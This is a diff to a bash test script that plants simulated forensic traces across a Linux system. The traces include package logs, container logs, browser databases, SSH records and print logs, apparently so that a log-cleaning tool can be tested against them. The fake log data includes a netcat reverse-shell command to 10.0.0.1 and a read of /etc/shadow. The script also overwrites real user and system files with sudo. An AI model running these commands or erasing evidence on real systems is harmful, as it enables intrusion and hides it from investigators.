@@ -263,6 +263,249 @@ DeletionDate=$(date +%Y-%m-%dT%H:%M:%S)" > ~/.local/share/Trash/info/sensitive.t
     fi
     
     echo "[✓] Advanced Linux artifacts created"
+    
+    echo "[*] Creating package manager artifacts..."
+    
+    # APT/DPKG artifacts
+    if command -v apt >/dev/null 2>&1 || command -v dpkg >/dev/null 2>&1; then
+        sudo bash -c '
+            # APT archives
+            mkdir -p /var/cache/apt/archives
+            echo "Cached package data" > /var/cache/apt/archives/malicious-tool_1.0_amd64.deb
+            echo "Cached exploit kit" > /var/cache/apt/archives/nmap_7.80_amd64.deb
+            
+            # APT logs
+            mkdir -p /var/log/apt
+            echo "Start-Date: $(date)" >> /var/log/apt/history.log
+            echo "Commandline: apt-get install netcat-openbsd" >> /var/log/apt/history.log
+            echo "Install: netcat-openbsd:amd64 (1.195-2ubuntu1)" >> /var/log/apt/history.log
+            echo "End-Date: $(date)" >> /var/log/apt/history.log
+            
+            echo "$(date) install netcat-openbsd:amd64 <none> 1.195-2ubuntu1" >> /var/log/apt/term.log
+            echo "$(date) install hydra:amd64 <none> 9.0-1" >> /var/log/apt/term.log
+            
+            # DPKG logs
+            echo "$(date) startup packages configure" >> /var/log/dpkg.log
+            echo "$(date) install netcat-openbsd:amd64 <none> 1.195-2ubuntu1" >> /var/log/dpkg.log
+            echo "$(date) install john:amd64 <none> 1.9.0-2" >> /var/log/dpkg.log
+        '
+    fi
+    
+    # YUM/DNF artifacts (simulate even if not present)
+    sudo bash -c '
+        mkdir -p /var/cache/yum /var/cache/dnf
+        echo "Cached RPM data" > /var/cache/yum/x86_64/7/base/suspicious-tool-1.0-1.x86_64.rpm
+        echo "DNF cache data" > /var/cache/dnf/fedora/packages/ncat-7.70-1.fc30.x86_64.rpm
+        
+        echo "$(date) Installed: nmap-7.70-1.fc30.x86_64" >> /var/log/yum.log
+        echo "$(date) Installed: john-1.9.0-1.el8.x86_64" >> /var/log/yum.log
+        
+        echo "$(date) INFO Installing: ncat-7.70-1.fc30.x86_64" >> /var/log/dnf.log
+        echo "$(date) INFO Installed: hydra-9.0-1.fc30.x86_64" >> /var/log/dnf.log
+    '
+    
+    # Pacman artifacts (simulate even if not present)
+    sudo bash -c '
+        mkdir -p /var/cache/pacman/pkg
+        echo "Pacman package cache" > /var/cache/pacman/pkg/nmap-7.80-1-x86_64.pkg.tar.xz
+        echo "Pacman package cache" > /var/cache/pacman/pkg/john-1.9.0-1-x86_64.pkg.tar.xz
+        
+        echo "[$(date)] [ALPM] installed nmap (7.80-1)" >> /var/log/pacman.log
+        echo "[$(date)] [ALPM] installed netcat (0.7.1-6)" >> /var/log/pacman.log
+    '
+    
+    echo "[✓] Package manager artifacts created"
+    
+    echo "[*] Creating container/VM artifacts..."
+    
+    # Docker artifacts
+    sudo bash -c '
+        # Docker container logs
+        mkdir -p /var/lib/docker/containers/abc123def456/
+        echo "$(date) Container started with suspicious command: nc -e /bin/bash 10.0.0.1 4444" > /var/lib/docker/containers/abc123def456/abc123def456-json.log
+        echo "$(date) Downloading payload from C2 server" >> /var/lib/docker/containers/abc123def456/abc123def456-json.log
+        
+        mkdir -p /var/lib/docker/containers/def456ghi789/
+        echo "$(date) Alpine container executing: cat /etc/shadow" > /var/lib/docker/containers/def456ghi789/def456ghi789-json.log
+    '
+    
+    # User Docker config
+    mkdir -p ~/.docker ~/.docker/machine/machines/evil-host
+    echo '{"auths":{"registry.evil.com":{"auth":"YWRtaW46cGFzc3dvcmQ="}}}' > ~/.docker/config.json
+    echo '{"Driver":{"MachineName":"evil-host","IPAddress":"10.0.0.1"}}' > ~/.docker/machine/machines/evil-host/config.json
+    
+    # Podman/K8s artifacts
+    sudo bash -c '
+        mkdir -p /var/lib/containers/storage/overlay/123abc/userdata
+        echo "Podman overlay userdata" > /var/lib/containers/storage/overlay/123abc/userdata/suspicious-mount.json
+        
+        mkdir -p /var/log/pods/kube-system_malicious-pod_abc123
+        echo "$(date) Pod log: Executing privilege escalation" > /var/log/pods/kube-system_malicious-pod_abc123/container.log
+    '
+    
+    # Libvirt/QEMU artifacts
+    sudo bash -c '
+        mkdir -p /var/log/libvirt/qemu /var/cache/libvirt/qemu
+        echo "$(date): starting up libvirt version: 6.0.0" > /var/log/libvirt/qemu/evil-vm.log
+        echo "$(date): QEMU_MONITOR_EVENT: event=POWERDOWN" >> /var/log/libvirt/qemu/evil-vm.log
+        
+        echo "QEMU cache data" > /var/cache/libvirt/qemu/capabilities.xml
+        echo "VM metadata cache" > /var/cache/libvirt/qemu/evil-vm.xml
+    '
+    
+    echo "[✓] Container/VM artifacts created"
+    
+    echo "[*] Creating browser artifacts..."
+    
+    # Firefox artifacts
+    mkdir -p ~/.mozilla/firefox/profile.default-release/cache2/entries
+    mkdir -p ~/.mozilla/firefox/profile.default-release/storage/default
+    mkdir -p ~/.mozilla/firefox/profile.default-release/thumbnails
+    mkdir -p ~/.mozilla/firefox/profile.default-release/sessionstore-backups
+    
+    echo "Mozilla cache entry" > ~/.mozilla/firefox/profile.default-release/cache2/entries/evil-site-cache
+    echo "Storage data" > ~/.mozilla/firefox/profile.default-release/storage/default/evil-site-storage
+    echo "Thumbnail data" > ~/.mozilla/firefox/profile.default-release/thumbnails/evil-thumbnail.jpg
+    echo "Session backup" > ~/.mozilla/firefox/profile.default-release/sessionstore-backups/recovery.jsonlz4
+    
+    # Create SQLite databases with test data
+    if command -v sqlite3 >/dev/null 2>&1; then
+        sqlite3 ~/.mozilla/firefox/profile.default-release/places.sqlite "CREATE TABLE moz_places (url TEXT); INSERT INTO moz_places VALUES ('http://evil-c2-server.com/panel');"
+        sqlite3 ~/.mozilla/firefox/profile.default-release/cookies.sqlite "CREATE TABLE moz_cookies (host TEXT, name TEXT); INSERT INTO moz_cookies VALUES ('evil-site.com', 'session_token');"
+        sqlite3 ~/.mozilla/firefox/profile.default-release/formhistory.sqlite "CREATE TABLE moz_formhistory (fieldname TEXT, value TEXT); INSERT INTO moz_formhistory VALUES ('password', 'admin123');"
+    else
+        echo "places.sqlite content" > ~/.mozilla/firefox/profile.default-release/places.sqlite
+        echo "cookies.sqlite content" > ~/.mozilla/firefox/profile.default-release/cookies.sqlite
+        echo "formhistory.sqlite content" > ~/.mozilla/firefox/profile.default-release/formhistory.sqlite
+    fi
+    
+    # Chrome/Chromium artifacts
+    mkdir -p ~/.config/google-chrome/Default/Cache
+    mkdir -p ~/.config/google-chrome/Default
+    mkdir -p ~/.config/chromium/Default/Cache
+    mkdir -p ~/.config/chromium/Default
+    
+    echo "Chrome cache data" > ~/.config/google-chrome/Default/Cache/evil-cache-entry
+    echo "Chrome history data" > ~/.config/google-chrome/Default/History
+    echo "Chrome cookies data" > ~/.config/google-chrome/Default/Cookies
+    echo "Chrome web data" > ~/.config/google-chrome/Default/Web\ Data
+    echo "Chrome top sites" > ~/.config/google-chrome/Default/Top\ Sites
+    
+    echo "Chromium cache data" > ~/.config/chromium/Default/Cache/evil-cache-entry
+    echo "Chromium history data" > ~/.config/chromium/Default/History
+    echo "Chromium cookies data" > ~/.config/chromium/Default/Cookies
+    echo "Chromium web data" > ~/.config/chromium/Default/Web\ Data
+    echo "Chromium top sites" > ~/.config/chromium/Default/Top\ Sites
+    
+    echo "[✓] Browser artifacts created"
+    
+    echo "[*] Creating SSH artifacts..."
+    
+    # SSH user artifacts
+    mkdir -p ~/.ssh
+    echo "# SSH known hosts" > ~/.ssh/known_hosts
+    echo "evil-server.com,10.0.0.1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." >> ~/.ssh/known_hosts
+    echo "c2-server.evil.com,192.168.1.100 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5..." >> ~/.ssh/known_hosts
+    echo "compromised-server.org,203.0.113.1 ecdsa-sha2-nistp256 AAAAE2VjZHNh..." >> ~/.ssh/known_hosts
+    
+    echo "$(date) SSH connection established to evil-server.com" > ~/.ssh/connection.log
+    echo "$(date) Key exchange completed with c2-server.evil.com" > ~/.ssh/debug.log
+    
+    # System SSH logs
+    sudo bash -c '
+        # Add SSH entries to auth.log that should be cleaned
+        echo "$(date) testhost sshd[12345]: Accepted publickey for root from 10.0.0.1 port 22 ssh2: RSA SHA256:abc123..." >> /var/log/auth.log
+        echo "$(date) testhost sshd[12346]: Connection from 192.168.1.100 port 54321 on 10.0.0.2 port 22" >> /var/log/auth.log
+        echo "$(date) testhost sshd[12347]: Failed password for admin from 203.0.113.1 port 22 ssh2" >> /var/log/auth.log
+        echo "$(date) testhost sshd[12348]: Disconnected from invalid user hacker 10.0.0.1 port 22" >> /var/log/auth.log
+        
+        echo "$(date) testhost sshd[12349]: Accepted password for testuser from 10.0.0.1 port 22 ssh2" >> /var/log/secure
+        echo "$(date) testhost sshd[12350]: pam_unix(sshd:session): session opened for user testuser by (uid=0)" >> /var/log/secure
+    '
+    
+    echo "[✓] SSH artifacts created"
+    
+    echo "[*] Creating additional systemd artifacts..."
+    
+    sudo bash -c '
+        # systemd random seed
+        echo "SystemD random seed data" > /var/lib/systemd/random-seed
+        
+        # Live session journal traces
+        mkdir -p /run/log/journal/abc123def456
+        echo "Live session journal entry" > /run/log/journal/abc123def456/system.journal
+        echo "Runtime journal entry" > /run/log/journal/abc123def456/user-1000.journal
+    '
+    
+    echo "[✓] Additional systemd artifacts created"
+    
+    echo "[*] Creating print subsystem artifacts..."
+    
+    sudo bash -c '
+        # CUPS artifacts
+        mkdir -p /var/spool/cups /var/log/cups
+        
+        # Print job spools
+        echo "PostScript print job data" > /var/spool/cups/c00001
+        echo "PDF print job data" > /var/spool/cups/c00002
+        echo "Suspicious document print job" > /var/spool/cups/c00003
+        
+        # CUPS logs
+        echo "I [$(date)] Accepting connections." > /var/log/cups/access_log
+        echo "10.0.0.1 - - [$(date)] \"POST /printers/LaserJet HTTP/1.1\" 200 0 Print-Job successful-ok" >> /var/log/cups/access_log
+        echo "192.168.1.100 - - [$(date)] \"POST /printers/HP-Printer HTTP/1.1\" 200 0 Print-Job confidential-document.pdf" >> /var/log/cups/access_log
+        
+        echo "E [$(date)] Unable to encrypt connection from 10.0.0.1!" > /var/log/cups/error_log
+        echo "W [$(date)] Suspicious print job from unauthorized user at 192.168.1.100" >> /var/log/cups/error_log
+        
+        echo "I [$(date)] Job 1 queued on \"HP-Printer\" by \"testuser\"." > /var/log/cups/page_log
+        echo "I [$(date)] Job 2 queued on \"LaserJet\" by \"admin\"." >> /var/log/cups/page_log
+    '
+    
+    echo "[✓] Print subsystem artifacts created"
+    
+    echo "[*] Creating additional forensic artifacts..."
+    
+    # DHCP leases
+    sudo bash -c '
+        mkdir -p /var/lib/dhclient
+        echo "lease {" > /var/lib/dhclient/dhclient.eth0.leases
+        echo "  interface \"eth0\";" >> /var/lib/dhclient/dhclient.eth0.leases
+        echo "  fixed-address 192.168.1.100;" >> /var/lib/dhclient/dhclient.eth0.leases
+        echo "  server-name \"evil-dhcp-server\";" >> /var/lib/dhclient/dhclient.eth0.leases
+        echo "}" >> /var/lib/dhclient/dhclient.eth0.leases
+    '
+    
+    # Create GTK bookmarks
+    mkdir -p ~/.config/gtk-3.0
+    echo "file:///tmp/suspicious-files Suspicious Files" > ~/.config/gtk-3.0/bookmarks
+    echo "file:///home/testuser/malware Malware Collection" >> ~/.config/gtk-3.0/bookmarks
+    
+    # Create recently used files
+    mkdir -p ~/.local/share
+    echo '<?xml version="1.0" encoding="UTF-8"?>' > ~/.local/share/recently-used.xbel
+    echo '<xbel version="1.0">' >> ~/.local/share/recently-used.xbel
+    echo '  <bookmark href="file:///tmp/suspicious-script.sh" added="2024-01-01T12:00:00Z" modified="2024-01-01T12:00:00Z" visited="2024-01-01T12:00:00Z"/>' >> ~/.local/share/recently-used.xbel
+    echo '  <bookmark href="file:///home/testuser/payload.bin" added="2024-01-01T12:01:00Z" modified="2024-01-01T12:01:00Z" visited="2024-01-01T12:01:00Z"/>' >> ~/.local/share/recently-used.xbel
+    echo '</xbel>' >> ~/.local/share/recently-used.xbel
+    
+    # Create crash dumps in known locations
+    sudo bash -c '
+        mkdir -p /var/crash
+        echo "Core dump from suspicious process" > /var/crash/core.suspicious-binary.12345.gz
+        echo "Crash report data" > /var/crash/_usr_bin_evil-tool.12345.crash
+    '
+    
+    # VS Code/Editor traces
+    mkdir -p ~/.local/share/code-server/User ~/.config/Code/User
+    echo '{"recentFiles":["/tmp/backdoor.py","/etc/passwd"]}' > ~/.local/share/code-server/User/settings.json
+    echo '{"workbench.startupEditor": "none", "files.associations": {"*.evil": "plaintext"}}' > ~/.config/Code/User/settings.json
+    
+    # JetBrains traces
+    mkdir -p ~/.local/share/.IntelliJIdea2023.1/system/log
+    echo "$(date) - Opened file: /tmp/malicious-script.py" > ~/.local/share/.IntelliJIdea2023.1/system/log/idea.log
+    
+    echo "[✓] Additional forensic artifacts created"
 }
 
 # Count artifacts before creation
